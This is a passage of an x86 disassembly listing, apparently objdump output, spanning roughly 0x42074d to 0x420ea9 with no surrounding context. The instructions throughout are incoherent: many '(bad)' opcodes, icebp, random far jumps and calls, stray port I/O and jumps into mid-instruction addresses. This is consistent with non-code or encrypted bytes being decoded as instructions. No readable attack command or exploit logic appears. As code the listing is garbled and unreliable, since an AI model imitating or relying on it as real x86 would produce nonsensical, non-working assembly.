  42074d:	(bad)
  420751:	scas   eax,DWORD PTR es:[edi]
  420752:	push   es
  420753:	or     ecx,0xffffffc0
  420756:	jecxz  0x420732
  420758:	lahf   
  420759:	or     BYTE PTR [ebx+edi*4],dl
  42075c:	inc    esi
  42075d:	inc    eax
  42075e:	cmp    bh,dh
  420760:	loop   0x4207e0
  420762:	xlat   BYTE PTR ds:[ebx]
  420763:	ds ss stos BYTE PTR es:[edi],al
  420766:	pusha  
  420767:	adc    eax,0x3af66e0f
  42076c:	inc    eax
  42076d:	pop    ss
  42076e:	les    esi,FWORD PTR [edx-0x1f820a57]
  420774:	mov    WORD PTR [esi+eiz*8-0x73],?
  420778:	repz adc DWORD PTR [eax+0x65cf7e11],ebx
  42077f:	xlat   BYTE PTR ds:[ebx]
  420780:	in     eax,dx
  420781:	lds    ebp,FWORD PTR [edi+0x29]
  420784:	jl     0x4207d7
  420786:	loop   0x420763
  420788:	add    DWORD PTR [eax-0x15],edx
  42078b:	mov    ebp,0x11734d7a
  420790:	fwait
  420791:	test   DWORD PTR es:[esi],ebx
  420794:	dec    ebp
  420795:	jp     0x4207da
  420797:	push   ecx
  420799:	addr16 inc ecx
  42079b:	sub    ebx,eax
  42079d:	push   ss
  42079e:	xchg   al,ch
  4207a0:	mov    dh,0x79
  4207a2:	mov    WORD PTR [edi],fs
  4207a4:	mov    BYTE PTR [esp+0x1e5333ea],dl
  4207ab:	mov    bl,0xf3
  4207ad:	scas   al,BYTE PTR es:[edi]
  4207ae:	or     al,0x80
  4207b0:	iret   
  4207b1:	sbb    BYTE PTR [edi+0x5],ch
  4207b4:	jmp    0x42078e
  4207b6:	add    al,0xd
  4207b8:	cmp    eax,0xa3950b32
  4207bd:	cs loop 0x420810
  4207c0:	pop    esp
  4207c1:	arpl   WORD PTR ds:0x7fb57f9d,si
  4207c7:	xchg   edx,eax
  4207c8:	jge    0x42082c
  4207ca:	mov    ds:0x979417d,al
  4207cf:	or     dl,BYTE PTR [ebx]
  4207d1:	adc    DWORD PTR [ebp+0x694eb2f],ecx
  4207d7:	or     al,0x7c
  4207d9:	pushf  
  4207da:	std    
  4207db:	popaw  
  4207dd:	cwde   
  4207de:	mov    cl,0x9a
  4207e0:	sub    dl,cl
  4207e2:	xlat   BYTE PTR ds:[ebx]
  4207e3:	adc    al,0x53
  4207e5:	aam    0x11
  4207e7:	jno    0x42080f
  4207e9:	lahf   
  4207ea:	pop    eax
  4207eb:	lds    edi,FWORD PTR [ebx]
  4207ed:	test   eax,0xd6c91a78
  4207f2:	pop    esi
  4207f3:	inc    ecx
  4207f4:	icebp  
  4207f5:	jne    0x42080a
  4207f7:	or     eax,0xc3b7cee7
  4207fc:	push   0xffffffbf
  4207fe:	push   edx
  4207ff:	fcmove st,st(0)
  420801:	data16 mov bh,0x89
  420804:	scas   eax,DWORD PTR es:[edi]
  420805:	jns    0x42079e
  420807:	ds int3 
  420809:	mov    edi,0xa7754228
  42080e:	cli    
  42080f:	jecxz  0x420865
  420811:	cld    
  420812:	outs   dx,BYTE PTR ds:[esi]
  420813:	in     eax,dx
  420814:	das    
  420815:	adc    DWORD PTR [ebp-0x768a42e1],ebp
  42081b:	lea    edx,[ecx-0x58]
  42081e:	or     BYTE PTR [ecx-0x28],ch
  420821:	pop    ecx
  420822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420823:	dec    ecx
  420824:	jbe    0x4207e4
  420826:	out    dx,al
  420827:	scas   eax,DWORD PTR es:[edi]
  420828:	add    BYTE PTR [eax],al
  42082a:	inc    esp
  42082b:	dec    ebp
  42082c:	dec    edx
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0xbb04921e
  420837:	test   BYTE PTR [ebx+0x1b],0x68
  42083b:	xchg   edi,eax
  42083c:	add    DWORD PTR [eax],eax
  42083e:	xchg   BYTE PTR [esi],al
  420840:	add    BYTE PTR [eax],al
  420842:	jno    0x42086b
  420844:	or     al,0x7f
  420846:	inc    esi
  420847:	jecxz  0x4207eb
  420849:	(bad)  
  42084a:	lahf   
  42084b:	add    ah,BYTE PTR [edx-0x5b914b3a]
  420851:	pop    esi
  420852:	adc    ecx,DWORD PTR [edx+0x1a]
  420855:	(bad)  
  420856:	cmc    
  420857:	adc    BYTE PTR [edx],ch
  420859:	mov    ds:0x2da9f113,al
  42085e:	inc    edi
  42085f:	mov    ecx,0x776d22fe
  420864:	push   edi
  420865:	xor    esi,DWORD PTR [ebx+0x0]
  420868:	mov    eax,0xb71dab1
  42086d:	icebp  
  42086e:	lock inc eax
  420870:	pushf  
  420871:	loopne 0x420883
  420873:	dec    eax
  420874:	xchg   edi,eax
  420875:	or     esp,DWORD PTR [ebx]
  420877:	and    BYTE PTR [ebp-0x70],al
  42087a:	or     dh,dl
  42087c:	cli    
  42087d:	ds jge 0x42089b
  420880:	pop    edi
  420881:	adc    DWORD PTR [edx+0x61],eax
  420884:	push   edx
  420885:	sbb    DWORD PTR [ecx-0x4c],ebx
  420888:	aam    0xac
  42088a:	dec    edx
  42088b:	icebp  
  42088c:	(bad)  
  42088d:	int3   
  42088e:	mov    cl,0x3
  420890:	(bad)  
  420891:	xor    esi,DWORD PTR [ecx]
  420893:	mov    bh,bl
  420895:	pop    esi
  420896:	ja     0x42090a
  420898:	and    eax,0xd0989e4c
  42089d:	and    BYTE PTR [esi+0x58],0x5
  4208a1:	cs sbb bl,cl
  4208a4:	sbb    DWORD PTR [esi],0xa5656548
  4208aa:	leave  
  4208ab:	dec    ebp
  4208ac:	jb     0x420870
  4208ae:	mov    al,0xc5
  4208b0:	and    al,0x2f
  4208b2:	loopne 0x420864
  4208b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208b5:	stc    
  4208b6:	popf   
  4208b7:	ficom  DWORD PTR [edi+edx*1+0x77da624f]
  4208be:	call   ebx
  4208c0:	ret    0x3878
  4208c3:	adc    DWORD PTR [ebp+0x6a],edi
  4208c6:	adc    al,0x23
  4208c8:	push   eax
  4208c9:	jnp    0x4208f7
  4208cb:	mov    BYTE PTR [edi],0xe
  4208ce:	and    eax,0x4dc89608
  4208d3:	cmp    DWORD PTR [ecx+esi*8+0x456ec23d],0xe6dc4bf
  4208de:	bound  edx,QWORD PTR [eax]
  4208e0:	sub    ah,cl
  4208e2:	leave  
  4208e3:	pop    ebp
  4208e4:	jb     0x420868
  4208e6:	jno    0x4208fc
  4208e8:	nop
  4208e9:	adc    al,BYTE PTR ds:0xe2a51a13
  4208ef:	mov    WORD PTR [edi],es
  4208f1:	push   esi
  4208f2:	test   eax,0x2afb15f5
  4208f7:	add    eax,0xe32185a
  4208fc:	pop    esi
  4208fd:	cmc    
  4208fe:	and    edi,DWORD PTR [ebx]
  420900:	jb     0x420900
  420902:	pop    ds
  420903:	xchg   edi,ebx
  420905:	shr    DWORD PTR [ebx*2+0x501bd8fb],1
  42090c:	ret    
  42090d:	or     eax,0xfdb68aff
  420912:	aas    
  420913:	aaa    
  420914:	push   0xffffffdc
  420916:	aas    
  420917:	push   esp
  420918:	cmp    cl,ah
  42091a:	clc    
  42091b:	out    0x88,eax
  42091d:	outs   dx,DWORD PTR ds:[esi]
  42091e:	push   eax
  42091f:	je     0x420933
  420921:	imul   esi,DWORD PTR [ebp-0x6c223052],0x7677a095
  42092b:	cld    
  42092c:	bound  edx,QWORD PTR [eax]
  42092e:	pop    ebp
  42092f:	mov    dh,0xf4
  420931:	adc    al,ch
  420933:	es mov esi,0x1c483c3d
  420939:	imul   edx,DWORD PTR [ebx+0x6299cba2],0x29
  420940:	outs   dx,BYTE PTR ds:[esi]
  420941:	mov    dh,BYTE PTR [eax-0x8f69ef3]
  420947:	sbb    eax,ebp
  420949:	es iret 
  42094b:	lock and DWORD PTR [ecx+ebp*4-0x72],eax
  420950:	scas   eax,DWORD PTR es:[edi]
  420951:	es pushf 
  420953:	jb     0x420952
  420955:	xchg   esi,eax
  420956:	test   esp,edx
  420958:	cmp    ebx,DWORD PTR [eax-0x7f02a15c]
  42095e:	cs sbb al,0x0
  420961:	jb     0x4209c4
  420963:	mov    DWORD PTR ds:0x6c09a524,esp
  420969:	icebp  
  42096a:	scas   eax,DWORD PTR es:[edi]
  42096b:	mov    WORD PTR [ecx],?
  42096d:	js     0x420988
  42096f:	outs   dx,BYTE PTR ds:[esi]
  420970:	outs   dx,DWORD PTR ds:[esi]
  420971:	imul   esi,DWORD PTR [esi-0x5ce1ebb6],0xffffff92
  420978:	stc    
  420979:	ret    0x97b4
  42097c:	cwde   
  42097d:	cwde   
  42097e:	call   0x5c92:0x34b09c80
  420985:	mov    cl,0x9a
  420987:	outs   dx,DWORD PTR ds:[esi]
  420988:	lock sbb DWORD PTR [esi+0x6f7df309],ecx
  42098f:	popf   
  420990:	sub    DWORD PTR [eax+eiz*2],0xffffff82
  420994:	push   gs
  420996:	inc    eax
  420997:	push   esi
  420998:	jle    0x4209f3
  42099a:	pushf  
  42099b:	cs pusha 
  42099d:	sub    BYTE PTR [ebx],cl
  42099f:	add    BYTE PTR [eax+0x617914ef],ch
  4209a5:	xor    DWORD PTR [ecx+0x5f],edx
  4209a8:	mov    ah,0x5d
  4209aa:	into   
  4209ab:	or     al,0xcc
  4209ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209ae:	add    al,0x82
  4209b0:	jnp    0x42094d
  4209b2:	mov    eax,ds:0x1b5547a1
  4209b7:	sub    bl,BYTE PTR [esi+ebx*2-0x6b70212a]
  4209be:	jecxz  0x4209a9
  4209c0:	ret    
  4209c1:	sbb    al,BYTE PTR [edi]
  4209c3:	(bad)  
  4209c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209c5:	(bad)  
  4209c6:	rcr    DWORD PTR [ebp-0x7d],1
  4209c9:	mov    esp,0xe2b0e062
  4209ce:	lahf   
  4209cf:	daa    
  4209d0:	mov    esp,?
  4209d2:	mov    bh,0x9b
  4209d4:	jmp    0x4efd:0x234a6912
  4209db:	add    al,0xfa
  4209dd:	stos   DWORD PTR es:[edi],eax
  4209de:	xchg   esp,eax
  4209df:	pop    ss
  4209e0:	dec    edx
  4209e1:	into   
  4209e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209e3:	jmp    0x11df:0x5087306b
  4209ea:	sub    DWORD PTR [ebp+0x6c75d6ca],eax
  4209f0:	mov    al,ds:0x8ff9e192
  4209f5:	(bad)  
  4209f6:	fs add BYTE PTR gs:[esi+0x2c],0x6d
  4209fc:	cmp    dh,ch
  4209fe:	ss push edi
  420a00:	fimul  DWORD PTR [eax+0x2c]
  420a03:	fcom   QWORD PTR [edx]
  420a05:	dec    ebx
  420a06:	ror    BYTE PTR [esi],0x98
  420a09:	outs   dx,DWORD PTR ds:[esi]
  420a0a:	inc    ebp
  420a0b:	sbb    DWORD PTR [edi],eax
  420a0d:	pop    eax
  420a0e:	push   ecx
  420a0f:	inc    edi
  420a10:	lds    ebx,FWORD PTR [ecx-0x14]
  420a13:	inc    eax
  420a14:	das    
  420a15:	mov    ecx,0x605928f5
  420a1a:	adc    eax,0x222b2ca7
  420a1f:	imul   esi,ebp,0x16a3a4b7
  420a25:	cli    
  420a26:	pop    ecx
  420a27:	jnp    0x4209b6
  420a29:	fcomp  QWORD PTR [edi+0x6d36fac9]
  420a2f:	jecxz  0x420a80
  420a31:	ror    DWORD PTR [ebx-0x64],0xc4
  420a35:	adc    al,0x70
  420a37:	loopne 0x420a38
  420a39:	pop    ecx
  420a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a3b:	add    eax,0x60e663c8
  420a40:	push   esi
  420a41:	or     esp,DWORD PTR [esi+0x3bd38fd6]
  420a47:	pop    esp
  420a48:	mov    ah,dh
  420a4a:	mov    WORD PTR [ebx-0x71609171],ss
  420a50:	mov    ebx,0x31dfe69
  420a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a56:	mov    DWORD PTR [ebx-0x4bb70393],ebp
  420a5c:	jbe    0x420a1d
  420a5e:	in     eax,dx
  420a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a60:	xor    ah,BYTE PTR [edx]
  420a62:	(bad)  
  420a63:	in     al,0xa4
  420a65:	adc    BYTE PTR [edi+edx*1+0x52],dh
  420a69:	and    al,0xd1
  420a6b:	cli    
  420a6c:	sti    
  420a6d:	sti    
  420a6e:	mov    eax,0x1de274f5
  420a73:	mov    bl,0x3
  420a75:	outs   dx,DWORD PTR fs:[esi]
  420a77:	push   ds
  420a78:	xchg   ebp,eax
  420a79:	add    esp,eax
  420a7b:	push   0xfffffff8
  420a7d:	cs push 0xffffffb1
  420a80:	iret   
  420a81:	bound  esp,QWORD PTR [esp+esi*1+0x6a]
  420a85:	inc    ecx
  420a86:	hlt    
  420a87:	mov    ds:0x2b1a499,al
  420a8c:	cld    
  420a8d:	js     0x420ad1
  420a8f:	pusha  
  420a90:	ins    DWORD PTR es:[edi],dx
  420a91:	mov    eax,0x774611c5
  420a96:	mov    bh,0x2a
  420a98:	leave  
  420a99:	lea    ecx,[esi+0x7b]
  420a9c:	cdq    
  420a9d:	sbb    DWORD PTR [eax-0x3f],esp
  420aa0:	dec    ebp
  420aa1:	lahf   
  420aa2:	lock sbb BYTE PTR [edi],dl
  420aa5:	ja     0x420aa2
  420aa7:	out    dx,eax
  420aa8:	clc    
  420aa9:	push   0x79
  420aab:	jle    0x420a74
  420aad:	mov    al,ds:0xa6e9d5d8
  420ab2:	sti    
  420ab3:	test   BYTE PTR ds:0x6c63790c,bh
  420ab9:	mov    WORD PTR [ecx+0x0],es
  420abc:	and    esi,0xffffffb0
  420abf:	jno    0x420a85
  420ac1:	stos   BYTE PTR es:[edi],al
  420ac2:	pop    ds
  420ac3:	dec    ebx
  420ac4:	mov    ds:0x66638f73,eax
  420ac9:	sahf   
  420aca:	push   0xffffff85
  420acc:	dec    ecx
  420acd:	and    eax,ecx
  420acf:	aad    0x6c
  420ad1:	(bad)  
  420ad2:	out    dx,eax
  420ad3:	mov    DWORD PTR [esi+0x4f541edd],esp
  420ad9:	push   ecx
  420ada:	push   ebx
  420adb:	push   ebp
  420adc:	dec    esp
  420add:	mov    ds:0x26a0067a,al
  420ae2:	mov    ds:0x3e7bc9da,al
  420ae7:	pop    eax
  420ae8:	(bad)  
  420ae9:	pop    edi
  420aea:	sub    eax,DWORD PTR [edx+eax*8-0x71]
  420aee:	push   ebp
  420aef:	repz sub ch,BYTE PTR ds:0xb887b366
  420af6:	inc    esp
  420af7:	mov    ecx,0x8f6923b6
  420afc:	dec    edi
  420afd:	mov    cl,BYTE PTR [eax]
  420aff:	xchg   ecx,eax
  420b00:	xchg   ecx,eax
  420b01:	mov    bh,cl
  420b03:	das    
  420b04:	es aam 0xa5
  420b07:	pop    ss
  420b08:	mov    ebx,0x18d1857b
  420b0d:	in     eax,0x9f
  420b0f:	push   edi
  420b10:	int3   
  420b11:	popf   
  420b12:	scas   eax,DWORD PTR es:[edi]
  420b13:	ror    BYTE PTR [eax+0x2a],1
  420b16:	mov    ds:0xd8e9a624,eax
  420b1b:	retf   0x64f5
  420b1e:	mov    DWORD PTR [ebx],esp
  420b20:	pop    ebx
  420b21:	clc    
  420b22:	pop    edi
  420b23:	mov    dl,bh
  420b25:	cmp    al,0x79
  420b27:	sub    bh,BYTE PTR [ebx-0x20aec413]
  420b2d:	hlt    
  420b2e:	xor    al,0x85
  420b30:	push   ds
  420b31:	stos   DWORD PTR es:[edi],eax
  420b32:	xchg   esi,eax
  420b33:	jmp    0x420b3a
  420b35:	cs dec edx
  420b37:	ss stos BYTE PTR es:[edi],al
  420b39:	loop   0x420b64
  420b3b:	jg     0x420ba7
  420b3d:	icebp  
  420b3e:	and    dl,BYTE PTR [ebp+ebx*2-0x67]
  420b42:	and    al,0xf8
  420b44:	icebp  
  420b45:	scas   eax,DWORD PTR es:[edi]
  420b46:	into   
  420b47:	push   edx
  420b48:	dec    esp
  420b49:	cmp    bh,BYTE PTR [ebp-0x4d]
  420b4c:	adc    al,0x5b
  420b4e:	mov    ds:0xe99cd0e,al
  420b53:	aam    0x75
  420b55:	call   DWORD PTR [edi+0x4]
  420b58:	or     eax,0x71074aef
  420b5d:	sti    
  420b5e:	(bad)  
  420b5f:	psubsw mm2,QWORD PTR [ebp-0x4f]
  420b63:	fcmovb st,st(3)
  420b65:	mov    WORD PTR [esi+0x3e5e4423],gs
  420b6b:	inc    ecx
  420b6c:	mov    al,0x15
  420b6e:	fiadd  WORD PTR [edi+0x14]
  420b71:	test   BYTE PTR [eax+0x39],dh
  420b74:	ja     0x420b2e
  420b76:	int3   
  420b77:	repz arpl bx,bx
  420b7a:	dec    ebx
  420b7b:	out    0x55,eax
  420b7d:	fld    DWORD PTR [esi+0x7a085fc0]
  420b83:	fidiv  WORD PTR [edx+0x36]
  420b86:	jmp    0xa2d52583
  420b8b:	ret    0xa863
  420b8e:	pop    eax
  420b8f:	inc    esi
  420b90:	ficomp DWORD PTR [ebx-0x71]
  420b93:	jmp    DWORD PTR [edx+0x2b26ba43]
  420b99:	cmp    eax,0xf613fee8
  420b9e:	fwait
  420b9f:	cmp    eax,0xad6ab093
  420ba4:	(bad)  
  420ba6:	in     al,0x6b
  420ba8:	add    al,0xe
  420baa:	clc    
  420bab:	les    ecx,FWORD PTR [ebp-0x2]
  420bae:	ret    0xe41a
  420bb1:	push   cs
  420bb2:	mov    al,0x65
  420bb4:	ins    BYTE PTR es:[edi],dx
  420bb5:	aad    0xf6
  420bb7:	je     0x420b54
  420bb9:	cmp    esi,eax
  420bbb:	cmp    DWORD PTR [ebx-0x79],0xffffffa9
  420bbf:	imul   ebp,DWORD PTR [edi+0xf8c2cf1],0xf
  420bc6:	fs dec esp
  420bc8:	inc    edi
  420bc9:	cmc    
  420bca:	xor    bh,BYTE PTR [eax-0x1d34e9f]
  420bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bd1:	lahf   
  420bd2:	fwait
  420bd3:	push   0x6f
  420bd5:	test   eax,0xe41a1827
  420bda:	inc    ebp
  420bdb:	loopne 0x420b60
  420bdd:	push   esi
  420bde:	fbld   TBYTE PTR [edi+0x13]
  420be1:	fadd   QWORD PTR [edx+eiz*2+0x1c]
  420be5:	outs   dx,BYTE PTR ds:[esi]
  420be6:	push   esi
  420be7:	xchg   ebx,eax
  420be8:	jb     0x420bb9
  420bea:	xor    al,0x2a
  420bec:	pop    esi
  420bed:	call   0xaca0000d
  420bf2:	test   eax,0xc8d397d4
  420bf7:	fmul   QWORD PTR [ebx-0xb]
  420bfa:	mov    ds:0x6b0f2736,eax
  420bff:	mov    BYTE PTR [edi-0x70],0xcc
  420c03:	xor    ecx,DWORD PTR [ebx-0x37]
  420c06:	pop    ds
  420c07:	call   0x9011:0x1fd52acb
  420c0e:	adc    cl,BYTE PTR [esp+esi*2]
  420c11:	pop    es
  420c12:	sti    
  420c13:	in     eax,0x6d
  420c15:	loop   0x420c2d
  420c17:	pushf  
  420c18:	inc    edi
  420c19:	in     al,0xe7
  420c1b:	jb     0x420be5
  420c1d:	jb     0x420c64
  420c1f:	inc    ebx
  420c20:	inc    esi
  420c21:	add    DWORD PTR ds:0x8dab45a5,ebp
  420c27:	mul    BYTE PTR ss:[edx+0x70916575]
  420c2e:	xchg   DWORD PTR cs:[edi+eiz*4+0x2d],ebp
  420c33:	test   BYTE PTR [ecx-0x5c802eff],bh
  420c39:	call   0x5bdd:0x525a632f
  420c40:	sub    edx,edi
  420c42:	stos   DWORD PTR es:[edi],eax
  420c43:	les    eax,FWORD PTR [ecx]
  420c45:	sbb    BYTE PTR [ecx+0x3d87bb79],dh
  420c4b:	sbb    dh,ch
  420c4d:	mov    ecx,0xc52facb6
  420c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c53:	clc    
  420c54:	and    BYTE PTR [edx],dh
  420c56:	lods   eax,DWORD PTR ds:[esi]
  420c57:	mov    fs,WORD PTR [ebx-0x516f85ca]
  420c5d:	jmp    0x956e:0x602c97bf
  420c64:	xchg   dl,al
  420c66:	retf   0x7bbf
  420c69:	mov    ds:0xd841da10,al
  420c6e:	xchg   esp,eax
  420c6f:	inc    ecx
  420c70:	scas   eax,DWORD PTR es:[edi]
  420c71:	pushf  
  420c72:	xchg   edx,eax
  420c73:	rol    DWORD PTR [ebp-0x9],0xc5
  420c77:	out    dx,eax
  420c78:	jno    0x420c6e
  420c7a:	lea    ecx,[eax]
  420c7c:	xchg   DWORD PTR [edi+0x4],esi
  420c7f:	and    DWORD PTR [eax+0x9],ebx
  420c82:	jns    0x420cbf
  420c84:	sti    
  420c85:	in     eax,dx
  420c86:	lods   eax,DWORD PTR ds:[esi]
  420c87:	loope  0x420ce4
  420c89:	inc    ebp
  420c8a:	call   DWORD PTR [esi+0x67]
  420c8d:	add    eax,0xa6f4f1c8
  420c92:	and    al,0x5
  420c94:	inc    eax
  420c95:	push   ss
  420c96:	xor    DWORD PTR [ebx-0x2bbad186],esp
  420c9c:	mov    ds:0xe1589dd3,al
  420ca1:	arpl   WORD PTR [ecx+0x772effe7],cx
  420ca7:	sar    DWORD PTR [eax-0x5a1cccbe],cl
  420cad:	push   cs
  420cae:	sub    al,bh
  420cb0:	dec    ebx
  420cb1:	lahf   
  420cb2:	dec    ebp
  420cb3:	fnstcw WORD PTR [edi+ebp*1+0x1f]
  420cb7:	imul   DWORD PTR [edx-0xa]
  420cba:	cmp    al,0xf9
  420cbc:	push   ebp
  420cbd:	jae    0x420c8c
  420cbf:	add    dh,dh
  420cc1:	fcom   QWORD PTR [ecx+eax*1]
  420cc4:	retf   
  420cc5:	push   cs
  420cc6:	pop    eax
  420cc7:	sub    cl,BYTE PTR [esi]
  420cc9:	pop    esi
  420cca:	in     eax,dx
  420ccb:	sub    eax,0x4faa3ce9
  420cd0:	cmc    
  420cd1:	imul   ebp,DWORD PTR [esi-0x1a],0x6a
  420cd5:	in     eax,dx
  420cd6:	xor    DWORD PTR [edx+edx*1],ecx
  420cd9:	push   edi
  420cda:	jno    0x420c81
  420cdc:	dec    esi
  420cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cde:	scas   eax,DWORD PTR es:[edi]
  420cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ce0:	stos   DWORD PTR es:[edi],eax
  420ce1:	inc    edx
  420ce2:	jns    0x420d4c
  420ce4:	out    dx,eax
  420ce5:	out    dx,al
  420ce6:	mov    bl,0x3c
  420ce8:	loope  0x420c6c
  420cea:	push   ebp
  420ceb:	mov    WORD PTR [ecx],cs
  420ced:	lock daa 
  420cef:	xchg   BYTE PTR [eax],cl
  420cf1:	fwait
  420cf2:	lock fs iret 
  420cf5:	idiv   DWORD PTR [ebx]
  420cf7:	push   0x41b26764
  420cfc:	jge    0x420d10
  420cfe:	(bad)  
  420cff:	fidiv  WORD PTR [esi]
  420d01:	or     DWORD PTR [esi-0x83be060],0xffffffc8
  420d08:	and    al,0x93
  420d0a:	mov    DWORD PTR [esi+ecx*1],ebp
  420d0d:	inc    ebp
  420d0e:	test   DWORD PTR [ebp-0xbd74e38],esp
  420d14:	mov    edx,0xff367dc
  420d19:	mov    ch,0xea
  420d1b:	cs push esi
  420d1d:	jge    0x420d5d
  420d1f:	adc    eax,0x32aa04af
  420d24:	push   ss
  420d25:	mov    WORD PTR [ebx],cs
  420d27:	hlt    
  420d28:	mov    bl,0x6f
  420d2a:	out    dx,eax
  420d2b:	rcr    BYTE PTR [edi+0x70],cl
  420d2e:	or     ch,BYTE PTR [edx]
  420d30:	adc    ebp,DWORD PTR [edx+0x57]
  420d33:	dec    ebx
  420d34:	jg     0x420cda
  420d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d37:	std    
  420d38:	ret    0xc663
  420d3b:	jge    0x420d03
  420d3d:	mov    al,0xec
  420d3f:	adc    eax,0x9ef13c72
  420d44:	sbb    al,0xc
  420d46:	and    eax,0xbbe8fb98
  420d4b:	and    BYTE PTR [ecx],ch
  420d4d:	jecxz  0x420d00
  420d4f:	into   
  420d50:	(bad)  
  420d51:	pop    es
  420d52:	sbb    edi,DWORD PTR ds:0xaa2978f9
  420d58:	pop    ebp
  420d59:	push   es
  420d5a:	scas   eax,DWORD PTR es:[edi]
  420d5b:	(bad)  
  420d5c:	xor    eax,0xe05683c4
  420d61:	ins    DWORD PTR es:[edi],dx
  420d62:	ret    0x8b06
  420d65:	and    bl,BYTE PTR [ebx-0x66dadfc1]
  420d6b:	(bad)  
  420d6c:	pop    ss
  420d6d:	ja     0x420d66
  420d6f:	popf   
  420d70:	outs   dx,DWORD PTR ds:[esi]
  420d71:	dec    ebx
  420d72:	jns    0x420d84
  420d74:	sub    al,0x4d
  420d76:	xchg   ecx,eax
  420d77:	inc    esi
  420d78:	cmc    
  420d79:	pop    ss
  420d7a:	mov    dh,BYTE PTR [edi+ebx*1]
  420d7d:	fidivr WORD PTR [esi]
  420d7f:	jo     0x420d8c
  420d81:	in     al,0xa2
  420d83:	mov    ds:0x578257c2,al
  420d88:	jbe    0x420d51
  420d8a:	cdq    
  420d8b:	xor    DWORD PTR [ebx+0x41],ecx
  420d8e:	out    0x34,al
  420d90:	jmp    0x7b5137d
  420d95:	xchg   ebx,eax
  420d96:	(bad)  
  420d97:	jp     0x420d2f
  420d99:	fwait
  420d9a:	out    dx,eax
  420d9b:	pop    ds
  420d9c:	mov    al,ds:0xc4c0db4e
  420da1:	jb     0x420e00
  420da3:	or     bh,dh
  420da5:	xchg   ebx,eax
  420da6:	clc    
  420da7:	je     0x420d43
  420da9:	test   al,0x9d
  420dab:	sbb    ecx,edx
  420dad:	jnp    0x420d54
  420daf:	add    di,WORD PTR [ecx]
  420db2:	sub    al,0xb9
  420db4:	xchg   DWORD PTR [ecx],ebp
  420db6:	xlat   BYTE PTR ds:[ebx]
  420db7:	push   edi
  420db8:	(bad)  
  420db9:	rep stos BYTE PTR es:[edi],al
  420dbb:	scas   eax,DWORD PTR es:[edi]
  420dbc:	loop   0x420e06
  420dbe:	push   ebp
  420dbf:	shl    DWORD PTR [ebx],0x2
  420dc2:	push   ds
  420dc3:	fprem  
  420dc5:	jns    0x420e1e
  420dc7:	js     0x420e34
  420dc9:	sub    eax,DWORD PTR [esp+ebx*1+0x61fa6282]
  420dd0:	sub    al,0x58
  420dd2:	or     bl,0x17
  420dd5:	sub    al,0xb
  420dd7:	lea    esi,[eax]
  420dd9:	sbb    al,0xdf
  420ddb:	jmp    0x2914997c
  420de0:	outs   dx,DWORD PTR ds:[esi]
  420de1:	aad    0x18
  420de3:	imul   cl
  420de5:	jp     0x420da3
  420de7:	adc    ch,al
  420de9:	mov    ah,BYTE PTR [edx-0x793ed12f]
  420def:	(bad)  
  420df0:	lods   eax,DWORD PTR ds:[esi]
  420df1:	loope  0x420e21
  420df3:	xchg   edx,eax
  420df4:	loope  0x420e39
  420df6:	cld    
  420df7:	ror    DWORD PTR gs:[ebx],0x82
  420dfb:	inc    ebp
  420dfc:	pusha  
  420dfd:	shl    DWORD PTR [esi],0x7a
  420e00:	push   edi
  420e01:	cli    
  420e02:	fwait
  420e03:	jne    0x420d87
  420e05:	or     BYTE PTR ds:0xdce64fe7,dh
  420e0b:	mov    ebx,0x8686418f
  420e10:	jnp    0x420df4
  420e12:	or     eax,0xd62239b7
  420e17:	aas    
  420e18:	xchg   DWORD PTR [ebx+0x11],ebx
  420e1b:	dec    edx
  420e1c:	xchg   ebx,eax
  420e1d:	outs   dx,BYTE PTR ds:[esi]
  420e1e:	int    0x11
  420e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e21:	mov    edi,0x9958ec5c
  420e26:	sbb    al,0x8
  420e28:	inc    ecx
  420e29:	xchg   ebx,eax
  420e2a:	ret    0xeb8f
  420e2d:	dec    eax
  420e2e:	out    0x9c,al
  420e30:	xor    dh,BYTE PTR [ebx+0x1d24b1e]
  420e36:	mov    eax,0x93d0d8f5
  420e3b:	fild   WORD PTR [ebp-0x7b]
  420e3e:	imul   DWORD PTR [esi-0x52]
  420e41:	mov    dh,0x98
  420e43:	sub    edx,DWORD PTR [edx-0x3f]
  420e46:	and    eax,0xd4130b17
  420e4b:	push   esi
  420e4c:	push   0xaa37f6e4
  420e51:	dec    esi
  420e52:	sbb    dh,bl
  420e54:	fsubr  DWORD PTR [ebx+0x5a]
  420e57:	cmp    esp,DWORD PTR [eax+0x54fecf75]
  420e5d:	test   WORD PTR [esi],ax
  420e60:	sbb    edx,ecx
  420e62:	arpl   WORD PTR [ebp+0x77],bp
  420e65:	push   esi
  420e66:	dec    esi
  420e67:	fimul  DWORD PTR [ebx]
  420e69:	rcl    BYTE PTR [eax+0x5a],0x3a
  420e6d:	pop    ebp
  420e6e:	(bad)
  420e71:	or     eax,0xd9140a50
  420e76:	and    al,0x79
  420e78:	sub    bl,BYTE PTR [esp+edi*2]
  420e7b:	xchg   esp,eax
  420e7c:	pop    es
  420e7d:	and    eax,0xc3bd82e2
  420e82:	sbb    DWORD PTR [ecx],ecx
  420e84:	popf   
  420e85:	cmp    DWORD PTR [edx+ebp*8-0x48],eax
  420e89:	push   ebx
  420e8a:	mov    edx,0x4785ac45
  420e8f:	add    DWORD PTR [edx-0x3c96f725],ebx
  420e95:	add    ebx,DWORD PTR [edx+eiz*1+0x15]
  420e99:	fsubrp st(7),st
  420e9b:	cs jecxz 0x420e54
  420e9e:	adc    DWORD PTR [edx+eax*1-0xbbf7491],eax
  420ea5:	xor    cl,bh
  420ea7:	loop   0x420ef3
  420ea9:	lahf   
